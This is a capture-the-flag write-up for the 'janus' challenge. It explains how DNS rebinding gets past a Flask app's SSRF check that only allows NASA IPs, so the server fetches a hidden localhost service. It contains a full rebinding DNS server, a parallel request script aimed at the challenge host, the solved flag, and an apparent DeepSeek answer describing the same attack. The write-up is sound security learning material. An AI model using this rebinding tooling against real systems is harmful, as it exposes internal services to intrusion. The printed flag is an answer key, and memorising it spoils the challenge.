# janus

```
Someone hacked my space image viewer, but it's 100% secure now! Note: Attacking nasa's API is out of scope for this challenge and you may brute force at most 100 requests at one request per second.
https://janus.secso.cc 
```

Attachment:

```python
from flask import Flask, request, Response, abort, render_template
import time
import socket
import requests
from urllib.parse import urlparse

app = Flask(__name__)

# Resolve NASA's IP at startup
NASA_HOST = "images-api.nasa.gov"

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api")
def api():
    NASA_IPS = set(socket.gethostbyname_ex(NASA_HOST)[2]).union({'3.175.115.68', '3.175.115.60', '3.175.115.113', '3.175.115.52'})

    target_url = request.args.get("url")
    if not target_url:
        abort(400, "Missing url parameter")

    # Parse the target URL
    parsed = urlparse(target_url)
    if not parsed.scheme:
        target_url = "https://" + target_url  # assume https if missing
        parsed = urlparse(target_url)

    hostname = parsed.hostname
    if not hostname:
        abort(400, "Invalid URL")

    # Prevent users brute forcing our api
    time.sleep(1)
    try:
        resolved_ip = socket.gethostbyname(hostname)
    except socket.gaierror as e:
        abort(400, "Unable to resolve hostname")

    # Verify that the url provided resolve's to NASA's IP address
    if resolved_ip not in NASA_IPS:
        abort(403, "URL does not resolve to NASA")

    # Fetch and stream the content
    try:
        r = requests.get(target_url, stream=True, timeout=5)
        if r.status_code == 429:
            abort(429, f"Rate limited by NASA. (This challenge is still solvable)")

        r.raise_for_status()
    except requests.RequestException as e:
        print("failed to fetch", target_url, e)
        abort(502, "Failed to fetch data")

    return Response(
        r.iter_content(chunk_size=8192),
        content_type=r.headers.get("Content-Type", "application/octet-stream"),
    )
```

There is a hidden service listening on `127.0.0.1:5001`:

```python
from flask import Flask, request, Response, abort

app = Flask(__name__)

@app.route("/")
def root():
    return "the flag will go here"
```

The container name in `docker-compose.yml` gives the hint:

```yaml
# Note that this is equivalent to:
# docker run -p 1337:1337 --dns 1.1.1.1 imagename

services:
  unnamed-dns-rebinding:
    build: .
    ports:
      - "1337:1337"
    dns:
      - 1.1.1.1
```

Using DNS rebinding attack, we:

1. changes the address that one hostname resolves to quickly
2. to pass the IP validation, the hostname resolves to a valid IP address for the first time
3. after one second, when the request is sent, the hostname resolves to `127.0.0.1`
4. so `http://127.0.0.1:5001` is accessed from the server
5. to avoid DNS caching, each time a new random hostname is used

To achieve this, we use a custom DNS server, based on a [gist](https://gist.github.com/pklaus/b5a7876d4d2cf7271873):

```python
#!/usr/bin/env python
"""
LICENSE http://www.apache.org/licenses/LICENSE-2.0
"""

import argparse
import datetime
import sys
import time
import threading
import traceback
import socketserver
import struct
import random

try:
    from dnslib import *
except ImportError:
    print(
        "Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`."
    )
    sys.exit(2)


TTL = 1


def dns_response(data):
    request = DNSRecord.parse(data)

    print(request)

    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

    qname = request.q.qname
    qn = str(qname)
    qtype = request.q.qtype
    qt = QTYPE[qtype]

    IPs = ["3.175.115.68", "127.0.0.1"]
    random.shuffle(IPs)
    reply.add_answer(RR(rname=qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=A(IPs[0])))

    print("---- Reply:\n", reply)

    return reply.pack()


class BaseRequestHandler(socketserver.BaseRequestHandler):

    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        now = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S.%f")
        print(
            "\n\n%s request %s (%s %s):"
            % (
                self.__class__.__name__[:3],
                now,
                self.client_address[0],
                self.client_address[1],
            )
        )
        try:
            data = self.get_data()
            print(len(data), data)  # repr(data).replace('\\x', '')[1:-1]
            self.send_data(dns_response(data))
        except Exception:
            traceback.print_exc(file=sys.stderr)


class TCPRequestHandler(BaseRequestHandler):

    def get_data(self):
        data = self.request.recv(8192).strip()
        sz = struct.unpack(">H", data[:2])[0]
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]

    def send_data(self, data):
        sz = struct.pack(">H", len(data))
        return self.request.sendall(sz + data)


class UDPRequestHandler(BaseRequestHandler):

    def get_data(self):
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


def main():
    parser = argparse.ArgumentParser(description="Start a DNS implemented in Python.")
    parser = argparse.ArgumentParser(
        description="Start a DNS implemented in Python. Usually DNSs use UDP on port 53."
    )
    parser.add_argument("--port", default=5053, type=int, help="The port to listen on.")
    parser.add_argument("--tcp", action="store_true", help="Listen to TCP connections.")
    parser.add_argument("--udp", action="store_true", help="Listen to UDP datagrams.")

    args = parser.parse_args()
    if not (args.udp or args.tcp):
        parser.error("Please select at least one of --udp or --tcp.")

    print("Starting nameserver...")

    servers = []
    if args.udp:
        servers.append(
            socketserver.ThreadingUDPServer(("", args.port), UDPRequestHandler)
        )
    if args.tcp:
        servers.append(
            socketserver.ThreadingTCPServer(("", args.port), TCPRequestHandler)
        )

    for s in servers:
        thread = threading.Thread(
            target=s.serve_forever
        )  # that thread will start one more thread for each request
        thread.daemon = True  # exit the server thread when the main thread terminates
        thread.start()
        print(
            "%s server loop running in thread: %s"
            % (s.RequestHandlerClass.__name__[:3], thread.name)
        )

    try:
        while 1:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()

    except KeyboardInterrupt:
        pass
    finally:
        for s in servers:
            s.shutdown()


if __name__ == "__main__":
    main()
```

Run it on a VPS with public IP address, and point a NS of a subdomain that we own to it:

```shell
sudo python3 server.py --udp --tcp --port 53
```

Then, we send request to the server in parallel:

```python
import requests
import random
import multiprocessing
import time
from multiprocessing import Process, Queue


def worker_function(url):
    try:
        r = requests.get(
            f"https://janus.secso.cc/api?url=http%3A%2F%2F{prefix}.test.jiegec.me:5001"
        )
        q.put(r.text)
    except:
        q.put("")
        pass


if __name__ == "__main__":
    while True:
        prefix = random.randint(0, 1000000000)
        # The NS of the REDACTED hostname points to the custom DNS server
        url = f"https://janus.secso.cc/api?url=http%3A%2F%2F{prefix}.REDACTED:5001"

        parallel = 16
        procs = []
        q = Queue()
        for i in range(parallel):
            proc = multiprocessing.Process(target=worker_function, args=(url,))
            proc.start()
            procs.append(proc)

        res = []
        for i in range(parallel):
            res.append(q.get())

        print(res)

        for i in range(parallel):
            procs[i].join()
```

Flag: `K17{DNS___more_l1ke_d0main_name_shuffl3}`.

DeepSeek:

```
To solve this CTF challenge, you need to exploit Server-Side Request Forgery (SSRF) to access a service running on `127.0.0.1:5001`. The Flask application restricts access to URLs that resolve to NASA's IP addresses. However, by using DNS rebinding, you can bypass this restriction.

### Solution
1. **Set up a domain** with DNS records that point to both a NASA IP and `127.0.0.1`. Use a NASA IP from the allowed list (e.g., `3.175.115.68`). Configure the DNS with two A records:
   - `attacker.com` IN A `3.175.115.68`
   - `attacker.com` IN A `127.0.0.1`
   Set a very low TTL (e.g., 1 second) and enable round-robin to ensure that consecutive DNS queries return different IPs.

2. **Make a request** to the Flask app's `/api` endpoint with the URL parameter set to `http://attacker.com:5001/`. For example:
   ```
   http://flask-app.com/api?url=http://attacker.com:5001/
   ```
   This URL uses port `5001` to target the local service.

3. **How it works**:
   - The server sleeps for 1 second, then resolves `attacker.com` using `socket.gethostbyname()`. Due to round-robin, it may receive the NASA IP, passing the check.
   - The server then uses `requests.get()` to fetch the URL. This triggers another DNS resolution for `attacker.com`. Due to round-robin, it may receive `127.0.0.1`, causing the request to connect to the local service on port `5001`.
   - If the first resolution returns `127.0.0.1`, the check fails, so you may need to repeat the request until it succeeds.

4. **Result**: The response from the Flask app will include the content from `127.0.0.1:5001`, which may contain the flag.

### Note
- This exploit relies on DNS rebinding and may require multiple attempts due to the round-robin DNS behavior.
- Ensure that the domain you use has DNS configured correctly with low TTL and round-robin enabled.

GET /api?url=http://attacker.com:5001/ HTTP/1.1
Host: flask-app.com
```
